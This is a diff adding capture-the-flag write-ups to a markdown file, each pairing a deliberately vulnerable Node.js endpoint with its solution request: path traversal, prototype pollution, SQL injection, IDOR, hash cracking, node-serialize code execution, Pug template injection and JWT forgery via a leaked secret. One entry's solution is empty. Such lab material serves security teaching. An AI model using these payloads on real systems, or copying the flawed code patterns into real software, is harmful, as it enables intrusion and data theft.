@@ -2172,6 +2172,776 @@ response:
 
 <br />
 
+### **#27: Privacy Policy Viewer Level 2**
+
+**Goal: **Read the content of the OS's `passwd` file
+
+**Code:**
+
+```javascript
+// viewer.js
+import { useRouter } from 'next/router';
+import React from 'react';
+
+export default function Home() {
+    const router = useRouter();
+    const { companyName } = router.query;
+    const isCompany = typeof companyName === 'string' && companyName.length > 0; 
+
+    const getPrivacyPolicy = (companyName) => {
+      fetch("../api/privacy", { method: "POST", body: JSON.stringify({ "companyName": companyName }),
+                                    headers: { "content-type": "application/json",}})
+      .then(response => response.json())
+      .then(json => { 
+        document.getElementById("content").innerText = json.text; 
+      })
+      .catch((e) => console.log("client:", e));
+    };
+
+    React.useEffect(() => {
+      if (router.isReady && isCompany) {
+        getPrivacyPolicy(companyName);
+        document.getElementById("title").innerText = `Privacy Policy for ${companyName}`; 
+      }
+    }, [router.isReady, isCompany]);
+
+  return (
+      <main className="text-center mt-5">
+        <h3 id="title" className="h3 mb-3 fw-normal">Privacy Policy Viewer</h3>
+        <pre>
+          <div id="content" style={{textAlign: 'left'}}>
+            No Policy Selected
+          </div>
+        </pre>
+      </main>
+  )
+}
+
+// api/privacy.js
+import fs from "fs";
+
+export default async (req, res) => {
+    try {
+        const text = fs.readFileSync(
+            `${process.cwd()}/privacyPolicies/${req.body.companyName.replaceAll("../","")}`,
+            { encoding: 'utf8', flag: 'r' });
+        res.send({ "text": text});
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    }
+};
+```
+
+solution
+
+```
+POST /api/privacy
+
+{
+  "companyName": "....//....//....//etc/passwd"
+}
+```
+
+
+
+<br />
+
+### **#28: Object Creator**
+
+**Goal: **Create 1 exclusive object, 1 exclusive object pending approval, and 1 standard object to win the flag!
+
+**Code:**
+
+```javascript
+const express = require('express');
+var bodyParser = require('body-parser');
+const app = express();
+require('dotenv').config();
+app.use(bodyParser.json());
+
+function createObjects(objects) { 
+    // code to save the custom object in the database 
+}
+function createExclusiveObjects(objects) { 
+    // code to save the exclusive object in the database
+}
+
+app.post('/api/createObjects', async function(req,res) {    
+    let objectsRetrieved = req.body;
+    const objectsToBeCreated = [];
+    let objectCount = 0;
+    let exclusiveObjectCount = 0;
+    let exclusiveUnapprovedObjectCount = 0;
+
+    try {
+        for(const object of objectsRetrieved) {
+            if(object.type === 'exclusive') {
+                if(object.exclusivePasscode === process.env.EXCLUSIVE_PASSCODE) {
+                    objectsToBeCreated.push(Object.assign({approved: true}, object));
+                } else {
+                    res.send('Invalid passcode');
+                    return;
+                }
+            } else {
+                objectsToBeCreated.push(Object.assign({approved: false}, object));
+            }
+        }
+        for(const object of objectsToBeCreated) {
+            if(object.type === 'exclusive' && object.approved) {
+                exclusiveObjectCount++;
+                createExclusiveObjects(object);
+            } else if(object.type === 'exclusive') {
+                exclusiveUnapprovedObjectCount++;
+            } else {
+                objectCount++;
+                createObjects(object);
+            }
+        }
+
+        res.send(`Successfully created ${exclusiveObjectCount} exclusive objects,` + 
+                 `${exclusiveUnapprovedObjectCount} exclusive objects pending approval and ` + 
+                 `${objectCount} standard objects`);
+
+    } catch(e) {
+        console.log(e);
+        res.send(e.message);
+    }
+});
+
+app.listen(process.env.PORT, () => {
+    console.log("Running at Port", process.env.PORT);
+});
+
+module.exports = app;
+```
+
+solution
+
+```
+POST /api/createObjects
+
+
+[
+  {
+    "type": "any",
+    "name": "standard"
+  },
+  {
+    "__proto__": {
+      "type": "exclusive"
+    },
+    "name": "pending"
+  },
+  {
+    "__proto__": {
+      "type": "exclusive"
+    },
+    "name": "Approved Exclusive",
+    "approved": true
+  }
+]
+```
+
+<br /><br />
+
+### **#29: Login as a User**
+
+**Goal: **With login page https://chal29-58jfkl.vercel.app login as a valid user
+
+**Code:**
+
+```javascript
+import dotenv from 'dotenv';
+import mysql from 'mysql2';
+dotenv.config();
+
+const getUser = async (userName, password) => {
+    let connection = mysql.createConnection(process.env.DATABASE_URL);
+    const query = `SELECT userName, password, type, firstName, lastName FROM all_users
+                    WHERE userName = '${userName}' and password = '${password}' limit 1`;
+    const [rows, fields] = await connection.promise().query(query);
+
+    connection.end();
+    return rows;
+}
+
+const login = async (userName, password) => {
+    const rows = await getUser(userName, password);
+    if(rows.length === 1) {
+        return {"message": "successfully logged on", 
+            "type": rows[0].type, 
+            "firstName": rows[0].firstName, 
+            "lastName": rows[0].lastName, 
+            "userName": rows[0].userName, 
+            "status": "success"
+        };
+    }
+    
+    return { "message": "Invalid username or password", "status": "failed" };
+};
+  
+export default async (req, res) => {
+    try {
+        const result = await login(req.body.user, req.body.password);
+        if(result.status === "success") {
+            res.status(200).send(result);
+        } else {
+            res.status(401).send(result);
+        }
+    } catch (e) {
+        res.status(500).send({ "message": e.message, "status": "failed" });
+    }
+};
+```
+
+solution
+
+```
+POST /api/login
+
+{
+  "user": "' UNION SELECT userName, password, type, firstName, lastName FROM all_users limit 1#",
+  "password": ""
+}
+```
+
+
+
+<br /><br />
+
+
+
+
+
+### **#30: Tell me who your friends are!**
+
+**Goal: **You are Bob Bishop, ID: 25010, get the list of friends for Nikki Hartman and win the flag!
+
+**Code:**
+
+```javascript
+// api/player.js
+import dotenv from 'dotenv';
+import mysql from 'mysql2';
+dotenv.config();
+
+const getPlayer = async (playerId) => {
+    if(playerId && String(playerId).trim() !== '' && !isNaN(playerId)) {
+        let connection = mysql.createConnection(process.env.DATABASE_URL);
+        const query = `SELECT * FROM players 
+                        WHERE id = ${playerId}`;
+        const [row, fields] = await connection.promise().query(query);
+        connection.end();
+        return row;
+    }
+}
+
+export default async (req, res) => {
+    try {
+        const result = await getPlayer(req.body.playerId);
+        if(result.length > 0) {
+            res.status(200).send(result);
+        } else {
+            res.status(401).send("Player not found!");
+        }
+    } catch (e) {
+        res.status(500).send(e.message);
+    }
+};
+
+// api/friends.js
+import dotenv from 'dotenv';
+import mysql from 'mysql2';
+dotenv.config();
+
+const getFriends = async (playerId) => {
+    if(playerId && String(playerId).trim() !== '' && !isNaN(playerId)) {
+        let connection = mysql.createConnection(process.env.DATABASE_URL);
+        const query = `SELECT p2.* FROM players p join friends f on p.id = f.player_id join players p2 on f.friend_id = p2.id
+                        WHERE p.id = ${playerId} order by f.friend_id desc`;
+        const [rows, fields] = await connection.promise().query(query);
+        connection.end();
+        return rows;
+    }
+}
+
+export default async (req, res) => {
+    try {
+        const result = await getFriends(req.body.playerId);
+        if(result.length > 0) {
+            res.status(200).send(result);
+        } else {
+            res.status(401).send("No friends found!");
+        }
+    } catch (e) {
+        res.status(500).send(e.message);
+    }
+};
+```
+
+solution:
+
+```
+POST /api/player
+
+{
+  "playerId": "25024"
+}
+```
+
+
+
+```
+POST /api/friends
+
+{
+  "playerId": "25024"
+}
+```
+
+
+
+
+
+### **#31: Login as Bob**
+
+**Goal: **Login as Bob Stamford (user: bobs) and win the flag!
+
+**Code:**
+
+```javascript
+import dotenv from 'dotenv';
+import mysql from 'mysql2';
+import crypto from 'crypto';
+dotenv.config();
+
+const getUser = async (userName) => {
+    let connection = mysql.createConnection(process.env.DATABASE_URL);
+
+    const query = `SELECT * FROM users2
+                    WHERE userName = '${userName}'`;
+    const [rows, fields] = await connection.promise().query(query);
+    connection.end();
+    return rows;
+}
+
+const login = async (userName, password, res) => {
+    const hashedPassword = crypto.createHash('md5').update(String(password)).digest("hex");
+    userName = userName.replaceAll("'", "");
+    const rows = await getUser(userName);
+    if(rows.length === 1) {
+        const hashed = rows[0].password;
+        if(hashed === hashedPassword) {
+            return rows;
+        } else {
+            res.setHeader('Hashed', hashed);
+        }
+    }
+
+    return "Invalid user or password";
+};
+  
+export default async (req, res) => {
+    try {
+        const result = await login(req.body.userName, req.body.password, res);
+        if(Array.isArray(result) && result.length > 0) {
+            res.status(200).send(result);
+        } else {
+            res.status(401).send(result);
+        }
+    } catch (e) {
+        res.status(500).send(e.message);
+    }
+};
+```
+
+solution
+
+```
+POST /api/login
+
+{
+  "userName": "bobs",
+  "password": null
+}
+```
+
+response:
+
+```
+HTTP/2 401 Unauthorized
+Hashed: b7e283a09511d95d6eac86e39e7942c0
+Content-Length: 24
+
+Invalid user or password
+```
+
+<br />crack the hash `b7e283a09511d95d6eac86e39e7942c0`, the password is `password123!`
+
+```
+POST /api/login
+
+{
+  "userName": "bobs",
+  "password": "password123!"
+}
+```
+
+
+
+<br />
+
+<br />
+
+### **#32: Tell me who your friends are! #2**
+
+**Goal: **You are James Robins, ID: b97f9ae9-c4f7-4e5d-8d66-5fc537dce101, get the list of friend ids for Lee Wung and win the flag!
+
+**Code:**
+
+```javascript
+// api/player.js
+import dotenv from 'dotenv';
+import mysql from 'mysql2';
+const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+dotenv.config();
+
+const getPlayer = async (playerId) => {
+    if(playerId && String(playerId).match(uuidFormat)) {
+        let connection = mysql.createConnection(process.env.DATABASE_URL);
+        const query = `SELECT * FROM players_new 
+                        WHERE id = '${playerId}'`;
+        const [row, fields] = await connection.promise().query(query);
+        connection.end();
+        return row;
+    }
+}
+
+export default async (req, res) => {
+    try {
+        const result = await getPlayer(req.body.playerId);
+        if(result.length > 0) {
+            res.status(200).send(result);
+        } else {
+            res.status(401).send("Player not found!");
+        }
+    } catch (e) {
+        res.status(500).send(e.message);
+    }
+};
+
+// api/friends.js
+import dotenv from 'dotenv';
+import mysql from 'mysql2';
+const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+dotenv.config();
+
+const getFriendIds = async (playerId) => {
+    if(playerId && String(playerId).match(uuidFormat)) {
+        let connection = mysql.createConnection(process.env.DATABASE_URL);
+        const query = `SELECT f.friend_id FROM players_new p join friends_new f on p.id = f.player_id
+                        WHERE p.id = '${playerId}' order by f.friend_id desc`;
+        const [rows, fields] = await connection.promise().query(query);
+        connection.end();
+        return rows;
+    }
+}
+
+export default async (req, res) => {
+    try {
+        const result = await getFriendIds(req.body.playerId);
+        if(result.length > 0) {
+            res.status(200).send(result);
+        } else {
+            res.status(401).send("No friends found!");
+        }
+    } catch (e) {
+        res.status(500).send(e.message);
+    }
+};
+```
+
+<br />
+
+
+
+```
+POST /api/friends
+
+{
+  "playerId": "438f8018-9d27-4a6c-aa0a-712e1b89c8b7"
+}
+```
+
+<br />
+
+response:
+
+```
+[
+  {
+    "friend_id": "b97f9ae9-c4f7-4e5d-8d66-5fc537dce101"
+  },
+  {
+    "friend_id": "40d823e9-b2e2-4f24-8c06-aa4a11fde608"
+  }
+]
+```
+
+
+
+```
+POST /api/player
+
+{
+  "playerId": "40d823e9-b2e2-4f24-8c06-aa4a11fde608"
+}
+```
+
+<br />
+
+### **#33: Get my profile**
+
+**Goal: **Read the the OS's file `/etc/hosts` to win the flag!
+
+**Code:**
+
+```javascript
+var express = require('express');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var bodyParser = require('body-parser');
+var app = express();
+app.use(bodyParser.json());
+
+app.post('/getMyProfile', function(req, res) {
+    // For the purpose of this challenge, we are going to return a static base64 encoded JSON object
+	res.send({ "profile":  "eyAibmFtZSI6ICJIYWNrZXIgSnVuaW9yIiB9"});
+});
+
+app.post('/getMyName', function(req, res) {
+    let response = "";
+
+	if (req.body.profile) {
+		var buffer = new Buffer(req.body.profile, 'base64').toString();
+		var json = serialize.unserialize(buffer);
+		if (json.name) {
+			response = `${escape(json.name)}`;
+		}
+	} else {
+		response = "No profile provided";
+	}
+	res.send(response);
+});
+app.listen(3000);
+console.log("Listening on port 3000");
+```
+
+<br />
+
+the json.name should be in base64 
+
+```json
+{
+  "name": "_$$ND_FUNC$$_function(){ var fs = require('fs'); var result = fs.readFileSync('/etc/hosts', 'utf8'); return result; }()"
+}
+
+
+OR
+
+
+{
+  "name": "_$$ND_FUNC$$_function (){require('child_process').exec('cat /etc/hosts', function(error, stdout, stderr) {console.log(stdout)})()"
+}
+```
+
+<br />
+
+```
+POST /getMyName
+
+{
+  "profile": "eyAibmFtZSI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXsgdmFyIGZzID0gcmVxdWlyZSgnZnMnKTsgdmFyIHJlc3VsdCA9IGZzLnJlYWRGaWxlU3luYygnL2V0Yy9ob3N0cycsICd1dGY4Jyk7IHJldHVybiByZXN1bHQ7IH0oKSIgfQ=="
+}
+```
+
+<br />
+
+<br />
+
+### **#34: Welcome Message**
+
+**Goal: **Get an admin welcome message and win the flag!
+
+**Code:**
+
+```javascript
+const express = require('express');
+const pug = require('pug');
+var bodyParser = require('body-parser');
+require('dotenv').config();
+const app = express();
+app.use(bodyParser.json());
+
+app.post('/api/getWelcomeMessage', (req, res) => {
+    const fullName = req.body.fullName || 'Guest';
+
+    let templateString = '';
+    const adminKey = process.env.ADMIN_KEY;
+  
+    if(req.body.adminKey === adminKey) {
+      templateString = `| Welcome Admin! (Admin Key: **********${adminKey.substring(adminKey.length - 4)})`;
+    } else {
+      templateString = `| Welcome ${fullName}!`;
+    }
+
+    const output = pug.render(templateString);
+
+    res.send(output);
+});
+
+app.listen(process.env.PORT, () => {
+  console.log(`Server is running at http://localhost${process.env.PORT}`);
+});
+```
+
+<br />
+
+```
+POST /api/getWelcomeMessage
+
+{
+  "fullName": "#{process.env.ADMIN_KEY}"
+}
+```
+
+response:
+
+```
+Welcome J4589J98H4FG89HY34F89HI8FJMN349JF9J90JKCV490IK!
+```
+
+<br />
+
+```
+POST /api/getWelcomeMessage
+
+{
+  "fullName": "#{process.env.ADMIN_KEY}",
+  "adminKey": "J4589J98H4FG89HY34F89HI8FJMN349JF9J90JKCV490IK"
+}
+```
+
+<br />
+
+<br />
+
+
+
+
+
+### **#35: GET CRM USERS**
+
+**Goal: **Get the list of CRM users using '/getCRMUsers' endpoint and win the flag!
+
+**Code:**
+
+```javascript
+import express from 'express';
+import bodyParser from 'body-parser';
+import dotenv from 'dotenv';
+import { CRMUsers } from './crm.mjs';
+import libxmljs from "libxmljs";
+import fs from 'fs';
+const app = express();
+app.use(bodyParser.json());
+dotenv.config();
+
+const removeSubstringSecurely = function(text, substring) {
+    if (String(text).includes(substring)) {
+        return removeSubstringSecurely(text.replace(substring, ''), substring);
+    }
+    return text;
+}
+
+const sanitizeInput = (input) => {
+    let text = removeSubstringSecurely(input, "<!");
+    text = removeSubstringSecurely(text, "SYSTEM");
+    text = removeSubstringSecurely(text, "ENTITY");
+    text = removeSubstringSecurely(text, "DOCTYPE");
+    return text;
+}
+
+// Log the last request that failed
+const logLastFailure = (message) => {
+    fs.writeFile('/tmp/last_req.log', message, (err) => {
+        if (err) { console.error(err); }
+    });
+}
+
+// Remove the last request log
+const removeLastRquestLog = () => {
+    fs.unlink('/tmp/last_req.log', (err) => {
+        if (err) { console.error(err); }
+    });
+}
+
+app.post('/getCRMUsers', async (req, res) => {
+    if(req.body.apiKey !== process.env.API_KEY) {
+        const lastReq = `Expected API Key: ${process.env.API_KEY} | Received API Key: ${req.body.apiKey}`;
+        logLastFailure(lastReq);
+        res.status(401).end("Unauthorized");
+    } else {
+        removeLastRquestLog();
+        res.send(CRMUsers);
+    }
+})
+
+app.post('/createCard', async (req, res) => {
+    try {
+        const role = sanitizeInput(req.body.role);
+        const firstName = sanitizeInput(req.body.firstName);
+        const lastName = sanitizeInput(req.body.lastName);
+
+        var xml = `<!--?xml version="1.0" ?-->
+                    <!DOCTYPE userCard [
+                                       <!ENTITY firstName "${firstName}">
+                                       <!ENTITY lastName "${lastName}">
+                                       <!ENTITY role "${role}">
+                                    ]>
+                    <userInfo>
+                    <fullRef>&firstName; &lastName;, &role;</fullRef>
+                    <firstName>&firstName;</firstName>
+                    <lastName>&lastName;</lastName>
+                    </userInfo>`;
+
+        const doc = libxmljs.parseXml(xml, {replaceEntities: true});
+        res.send(doc.toString());
+        removeLastRquestLog();
+    } catch (e) {
+        logLastFailure(e.message);
+        res.status(500).end(e.message);
+        console.error(e);
+    }
+});
+
+app.listen(process.env.port, () => {
+    console.log(`API listening on PORT ${process.env.port}`)
+})
+```
+
+
+
+```
+```
+
+
+
+
+
+<br />
+
 <br />
 
 
@@ -2231,6 +3001,18 @@ we need to make this condition to be true to push the elements into the array an
 ```json
 {"field":"city","":""}
 ```
+
+
+
+<br /><br />
+
+
+
+
+
+
+
+
 
 
 
@@ -4069,3 +4851,187 @@ console.log("coreCredString =", coreCredString);
 console.log("staticSessionToken =", staticSessionToken);
 ```
 
+
+
+
+
+
+
+
+
+### \#56: Hit the admin
+
+**Goal:** Get the flag by accessing the /admin endpoint
+
+**Code:**
+
+```javascript
+const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const jwt = require('jsonwebtoken');
+const path = require('path');
+dotenv = require('dotenv');
+// Load environment variables from .env file
+dotenv.config();
+
+// --- Config ---
+const JWT_SIGN = process.env.JWT_SIGNATURE;
+if (!JWT_SIGN) {
+  throw new Error('Missing JWT_SIGNATURE environment variable');
+}
+
+const app = express();
+app.use(bodyParser.json());
+app.use(cors());
+
+// In-memory database (temporary array)
+const users = [];
+
+// Serve the entire 'public' folder as static assets (optional)
+app.use(express.static(path.join(__dirname, 'public')));
+
+function auth(req, res, next) {
+  const token = req.body['session']; // token expected in request body
+  if (!token) {
+    return res.status(401).json({ message: 'Authentication required' });
+  }
+
+  // Verify the JWT token
+  jwt.verify(token, JWT_SIGN, (err, user) => {
+    if (err) {
+      const signatureB64 = Buffer.from(JWT_SIGN, 'utf8').toString('base64').replaceAll('=', '');
+      return res.status(403).json({
+        message: 'Invalid token',
+        intructions: `Please open a ticket with the following code ERR_SIGN_${signatureB64}`,
+      });
+    }
+
+    req.user = user;
+    req.admin = user && user.isAdmin === true;
+    next();
+  });
+}
+
+// Register a new user
+app.post('/register', (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) {
+    return res.status(400).json({ message: 'Username and password are required' });
+  }
+  const user = { username, password };
+  users.push(user);
+  res.status(201).json({ message: 'Registration successful' });
+});
+
+// Login and generate a JWT token (no isAdmin in normal login)
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  const user = users.find(u => u.username === username && u.password === password);
+  if (!user) {
+    return res.status(401).json({ message: 'Invalid credentials' });
+  }
+
+  const token = jwt.sign({ username }, JWT_SIGN, { algorithm: 'HS256', expiresIn: '1h' });
+  res.json({ token });
+});
+
+// Profile page accessible only to authenticated users
+app.post('/profile', auth, (req, res) => {
+  if (req.admin) {
+    return res.json({ message: 'You are the admin!' });
+  }
+  res.json({ message: `Welcome to your profile, ${req.user.username}. You are not the admin.` });
+});
+
+app.post('/admin', auth, (req, res) => {
+  if (!req.admin) return res.status(403).json({ message: 'Admins only' });
+  res.json({ message: 'Top secret admin data', flag: process.env.CTF_FLAG });
+});
+
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+  console.log(`CTF running on port ${port}`);
+});
+```
+
+<br />
+
+**Solution**
+
+```
+POST /register
+
+{"username":"admin","password":"123"}
+```
+
+<br />
+
+```
+POST /login
+
+{"username":"admin","password":"123"}
+```
+
+response:
+
+```
+{
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU2MjM1NzkzLCJleHAiOjE3NTYyMzkzOTN9.yIMENSiZj9JRSCFwsTsUvJNH8eZ-2slOpWOtaG-VMCQ"
+}
+```
+
+
+
+<br />
+
+```
+POST /profile
+
+
+{
+  "session": "eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU2MjM1NzkzLCJleHAiOjE3NTYyMzkzOTN9"
+}
+```
+
+response:
+
+```
+{
+  "message": "Invalid token",
+  "intructions": "Please open a ticket with the following code ERR_SIGN_c3VwZXJfc2VjcmV0X2p3dF9zaWduYXR1cmUyMDI1ISE"
+}
+```
+
+base64 decode of "c3VwZXJfc2VjcmV0X2p3dF9zaWduYXR1cmUyMDI1ISE" is "super_secret_jwt_signature2025!!" which is the jwt secret
+
+<br />
+
+Generate a new JWT token with "isAdmin": true
+
+![](./assets/10.png)
+
+<br />
+
+
+
+```
+POST /admin 
+
+{
+  "session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU2MjM1NzkzLCJleHAiOjE3NTYyMzkzOTN9.GsoLdSVmRE3MUXE1pkM2Xwmg7tjabBIDPxmSETRGhYk"
+}
+```
+
+<br />
+
+```
+{
+  "message": "Top secret admin data",
+  "flag": "Wizer{beware_of_jwt_token_misuse}"
+}
+```
+
+<br />
+
+from 46 - 49 XXX
